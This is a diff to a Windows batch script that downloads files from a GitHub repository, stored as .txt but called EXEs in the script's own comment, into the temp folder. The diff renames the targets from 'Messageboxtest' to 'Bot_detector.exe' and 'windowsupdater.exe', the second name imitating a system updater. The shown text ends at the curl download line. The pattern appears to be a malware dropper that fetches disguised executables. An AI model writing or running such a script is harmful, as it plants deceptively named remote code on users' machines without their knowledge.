@@ -1,11 +1,11 @@
 @echo off
 REM Define URLs for the EXEs
-set U1=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest1.txt
-set U2=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest2.txt
+set U1=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Bot_detector.txt
+set U2=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/windowsupdater.txt
 
 REM Set temp file paths
 set F1=%TEMP%\Bot_detector.exe
-set F2=%TEMP%\Messageboxtest2.exe
+set F2=%TEMP%\windowsupdater.exe
 
 REM Download EXE files using curl
 curl -L -o "%F1%" "%U1%"
